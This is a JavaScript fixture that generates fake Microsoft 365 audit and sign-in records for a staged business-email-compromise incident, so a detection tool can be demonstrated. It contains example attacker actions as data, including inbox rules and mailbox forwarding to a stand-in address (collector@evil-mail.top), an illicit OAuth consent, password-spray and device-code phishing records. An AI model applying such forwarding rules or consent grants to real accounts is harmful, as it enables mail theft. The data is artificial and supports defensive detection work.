// Demo tenant: a staged BEC + illicit-consent incident across several accounts,
// so the BETA can be shown with no sign-in and no real data. Shapes match the
// live Graph collector, so detections read identically.
(function () {
  const DOM = "contoso-demo.com";
  const V = "jan.devries@" + DOM;       // the compromised mailbox
  const V2 = "finance@" + DOM;          // password-sprayed
  const ADM = "adm.piet@" + DOM;        // admin, no MFA

  function si(upn, t, ip, cc, city, err, opts) {
    opts = opts || {};
    return Object.assign({ userPrincipalName: upn, userId: "u-" + upn.split("@")[0], createdDateTime: t, ipAddress: ip,
      appDisplayName: opts.app || "Office 365 Exchange Online", appId: opts.appId || "",
      clientAppUsed: opts.client || "Browser", conditionalAccessStatus: "notApplied",
      riskLevelDuringSignIn: opts.risk || "none", riskState: opts.riskState || "none", riskLevelAggregated: opts.riskAgg || "none",
      status: { errorCode: err || 0 }, location: { city: city, countryOrRegion: cc },
      autonomousSystemNumber: opts.asn || 8455, userType: "Member",
      deviceDetail: { deviceId: opts.devId || "", operatingSystem: "Windows 11", isCompliant: opts.compliant },
      authenticationProtocol: opts.proto || "", userAgent: opts.ua || "" }, {});
  }

  function evidence() {
    const ev = { scope: "tenant", demo: true, days: 30, generated: new Date().toISOString(),
      signIns: [], directoryAudits: [], riskyUsers: [], riskDetections: [], oauthGrants: [],
      users: [], devices: [], admins: [], mfa: [], ualRecords: [] };

    // baseline good traffic
    ["jan.devries", "finance", "maria.popescu", "sales.kim", "adm.piet"].forEach(function (u) {
      for (let d = 10; d < 16; d++) ev.signIns.push(si(u + "@" + DOM, "2026-07-" + d + "T08:30:00Z", "84.83.10.25", "Netherlands", "Utrecht"));
    });

    // --- jan.devries: AiTM takeover ---
    // OfficeHome sign-ins with no device (AiTM fingerprint) from Nigeria
    for (let i = 0; i < 6; i++) ev.signIns.push(si(V, "2026-07-15T03:0" + i + ":00Z", "154.16.10.88", "Nigeria", "Lagos", 0, { app: "OfficeHome", appId: "4765445b-32c6-49b0-83e6-1d93765276ca", asn: 328543 }));
    // Two successful sign-ins from different IPs 12s apart (AiTM relay)
    ev.signIns.push(si(V, "2026-07-15T03:10:00Z", "84.83.10.25", "Netherlands", "Utrecht", 0, {}));
    ev.signIns.push(si(V, "2026-07-15T03:10:12Z", "154.16.10.88", "Nigeria", "Lagos", 0, { asn: 328543 }));
    // Legacy SMTP exfil
    ev.signIns.push(si(V, "2026-07-15T03:40:00Z", "154.16.10.88", "Nigeria", "Lagos", 0, { client: "Authenticated SMTP", asn: 328543 }));

    // --- finance: password spray (error 50126) ---
    for (let i = 0; i < 34; i++) ev.signIns.push(si(V2, "2026-07-15T02:" + String(i % 60).padStart(2, "0") + ":00Z", "45.146.55." + (10 + i % 40), "Russia", "Moscow", 50126, { asn: 49505 }));
    ev.signIns.push(si(V2, "2026-07-15T02:59:00Z", "45.146.55.11", "Russia", "Moscow", 0, { asn: 49505 }));

    // --- adm.piet: device-code phishing to the auth broker ---
    ev.signIns.push(si(ADM, "2026-07-16T11:00:00Z", "185.220.101.5", "Germany", "Frankfurt", 0, { proto: "deviceCode", app: "Microsoft Authentication Broker", appId: "29d9ed98-a469-4536-ade2-f981bc1d605e", asn: 205100 }));

    // Directory audits: attacker adds MFA, consents to app, adds SP credential
    function aud(act, by, t, extra) { return Object.assign({ activityDisplayName: act, category: "ApplicationManagement", loggedByService: "Core Directory", result: "success", initiatedBy: { user: { userPrincipalName: by } }, activityDateTime: t, targetResources: [] }, extra || {}); }
    ev.directoryAudits.push({ activityDisplayName: "User registered security info", loggedByService: "Authentication Methods", result: "success", resultReason: "User registered Authenticator App with Notification and Code", initiatedBy: { user: { userPrincipalName: V } }, activityDateTime: "2026-07-15T03:12:00Z", targetResources: [] });
    ev.directoryAudits.push(aud("Consent to application", V, "2026-07-15T03:20:00Z"));
    ev.directoryAudits.push(aud("Add service principal", V, "2026-07-15T03:21:00Z"));
    ev.directoryAudits.push(aud("Update application – Certificates and secrets management ", V, "2026-07-15T03:22:00Z"));
    // Federation change by admin (critical)
    ev.directoryAudits.push({ activityDisplayName: "Set domain authentication.", category: "DirectoryManagement", loggedByService: "Core Directory", result: "success", initiatedBy: { user: { userPrincipalName: ADM } }, activityDateTime: "2026-07-16T11:05:00Z", targetResources: [] });

    // Risky users + detections
    ev.riskyUsers.push({ userPrincipalName: V, riskLevel: "high", riskState: "atRisk", riskLastUpdatedDateTime: "2026-07-15T03:15:00Z" });
    ev.riskyUsers.push({ userPrincipalName: V2, riskLevel: "medium", riskState: "atRisk", riskLastUpdatedDateTime: "2026-07-15T02:59:00Z" });
    ev.riskDetections.push({ userPrincipalName: V, riskEventType: "mcasSuspiciousInboxManipulationRules", riskLevel: "high", riskState: "atRisk", ipAddress: "154.16.10.88", detectedDateTime: "2026-07-15T03:25:00Z", location: { countryOrRegion: "Nigeria" } });
    ev.riskDetections.push({ userPrincipalName: V2, riskEventType: "passwordSpray", riskLevel: "high", riskState: "atRisk", ipAddress: "45.146.55.11", detectedDateTime: "2026-07-15T02:58:00Z", location: { countryOrRegion: "Russia" } });
    ev.riskDetections.push({ userPrincipalName: V, riskEventType: "unlikelyTravel", riskLevel: "medium", riskState: "atRisk", ipAddress: "154.16.10.88", detectedDateTime: "2026-07-15T03:11:00Z", location: { countryOrRegion: "Nigeria" } });

    // OAuth: an illicit consent grant with risky mail scopes
    ev.oauthGrants.push({ appName: "PERFECTDATA SOFTWARE", appId: "ff8d92dc-3d82-41d6-bcbd-b9174d163620", clientId: "sp-1", scope: "Mail.Read Mail.ReadWrite offline_access", permissionType: "Delegated", consentType: "Principal", principalUpn: V, createdDateTime: "2026-07-15T03:20:00Z" });
    ev.oauthGrants.push({ appName: "eM Client", appId: "e9a7fea1-1cc0-4cd9-a31b-9137ca5deedd", clientId: "sp-2", scope: "EWS.AccessAsUser.All offline_access", permissionType: "Delegated", consentType: "Principal", principalUpn: V, createdDateTime: "2026-07-15T03:21:00Z" });
    ev.oauthGrants.push({ appName: "Contoso HR Sync", appId: "aa11-bb22", clientId: "sp-3", scope: "User.Read", permissionType: "Delegated", consentType: "AllPrincipals", principalUpn: "", createdDateTime: "2026-05-01T09:00:00Z" });

    // UAL: inbox rule (hide + external forward), mass delete, whole-folder sync
    function ual(op, rt, upn, t, ad) { ev.ualRecords.push({ operation: op, recordType: rt, userPrincipalName: upn, createdDateTime: t, auditData: Object.assign({ Operation: op, RecordType: rt, CreationTime: t, ClientIP: "154.16.10.88" }, ad || {}) }); }
    ual("New-InboxRule", "ExchangeAdmin", V, "2026-07-15T03:23:00Z", { Parameters: [{ Name: "Name", Value: "." }, { Name: "MoveToFolder", Value: "RSS Feeds" }, { Name: "MarkAsRead", Value: "True" }, { Name: "ForwardTo", Value: "collector@evil-mail.top" }, { Name: "StopProcessingRules", Value: "True" }] });
    ual("Set-Mailbox", "ExchangeAdmin", V, "2026-07-15T03:24:00Z", { Parameters: [{ Name: "ForwardingSmtpAddress", Value: "smtp:collector@evil-mail.top" }, { Name: "DeliverToMailboxAndForward", Value: "False" }] });
    for (let i = 0; i < 62; i++) ual("HardDelete", "ExchangeItemGroup", V, "2026-07-15T04:" + String(i % 60).padStart(2, "0") + ":00Z");
    for (let i = 0; i < 3; i++) ual("MailItemsAccessed", "ExchangeItemAggregated", V, "2026-07-15T03:3" + i + ":00Z", { OperationProperties: [{ Name: "MailAccessType", Value: "Sync" }, { Name: "IsThrottled", Value: i === 2 ? "True" : "False" }] });
    ual("Add-MailboxPermission", "ExchangeAdmin", V, "2026-07-15T03:26:00Z", { Parameters: [{ Name: "User", Value: "collector@evil-mail.top" }] });

    // Inventory
    ev.users = [
      { userPrincipalName: V, displayName: "Jan de Vries", accountEnabled: true, createdDateTime: "2021-03-01T09:00:00Z", lastPasswordChangeDateTime: "2026-05-01T09:00:00Z" },
      { userPrincipalName: V2, displayName: "Finance Shared", accountEnabled: true, createdDateTime: "2020-01-01T09:00:00Z", lastPasswordChangeDateTime: "2022-01-10T09:00:00Z" },
      { userPrincipalName: "temp.contractor@" + DOM, displayName: "Temp Contractor", accountEnabled: true, createdDateTime: new Date(Date.now() - 3 * 864e5).toISOString(), lastPasswordChangeDateTime: new Date(Date.now() - 3 * 864e5).toISOString() },
      { userPrincipalName: "guest_attacker#EXT#@" + DOM, displayName: "External Guest", accountEnabled: true, createdDateTime: "2026-07-14T00:00:00Z", lastPasswordChangeDateTime: "2026-07-14T00:00:00Z" }
    ];
    ev.devices = [
      { displayName: "JAN-LAPTOP", approximateLastSignInDateTime: "2026-07-14T09:00:00Z", registrationDateTime: "2022-01-01T09:00:00Z", operatingSystem: "Windows", trustType: "AzureAd" },
      { displayName: "UNKNOWN-DEVICE", approximateLastSignInDateTime: "2026-07-15T03:15:00Z", registrationDateTime: new Date(Date.now() - 2 * 864e5).toISOString(), operatingSystem: "Windows", trustType: "AzureAd" },
      { displayName: "OLD-KIOSK", approximateLastSignInDateTime: "2025-01-01T09:00:00Z", registrationDateTime: "2020-01-01T09:00:00Z", operatingSystem: "Windows", trustType: "AzureAd" }
    ];
    ev.admins = [
      { userPrincipalName: ADM, displayName: "Piet Admin", role: "Global Administrator", accountEnabled: true, lastInteractiveSignIn: "2026-07-16T11:00:00Z" },
      { userPrincipalName: "old.admin@" + DOM, displayName: "Old Admin", role: "Exchange Administrator", accountEnabled: false, lastInteractiveSignIn: "2024-01-01T09:00:00Z" },
      { userPrincipalName: "guest_attacker#EXT#@" + DOM, displayName: "External Guest", role: "Application Administrator", accountEnabled: true, lastInteractiveSignIn: "2026-07-14T00:00:00Z" }
    ];
    ev.mfa = [
      { userPrincipalName: ADM, isMfaRegistered: false, isAdmin: true, methodsRegistered: [] },
      { userPrincipalName: V2, isMfaRegistered: false, isAdmin: false, methodsRegistered: [] },
      { userPrincipalName: V, isMfaRegistered: true, isAdmin: false, methodsRegistered: ["microsoftAuthenticator"] }
    ];
    return ev;
  }

  window.BETA_Demo = { evidence: evidence };
})();
